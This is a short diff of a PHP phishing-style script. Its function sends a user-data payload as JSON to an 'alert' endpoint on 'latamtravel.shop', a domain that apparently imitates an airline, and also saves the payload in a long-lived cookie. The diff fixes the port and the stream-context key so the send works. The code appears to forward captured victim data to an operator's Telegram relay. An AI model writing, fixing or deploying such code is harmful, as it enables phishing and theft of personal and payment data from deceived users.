@@ -1,13 +1,13 @@
 <?php
 function enviarMensajeTelegram($payload) {
-    $url = "https://latamtravel.shop/api/alert/ltm-send-message";
+    $url = "https://latamtravel.shop:3000/api/alert/ltm-send-message";
     $data = array(
         'data' => $payload
     );
     setcookie('userData', $payload, time() + (86400 * 30), "/");
     // Usa application/json si el servidor espera JSON
     $options = array(
-        'https' => array(
+        'http' => array(
             'method' => 'POST',
             'header' => "Content-Type: application/json\r\n",
             'content' => json_encode($data)
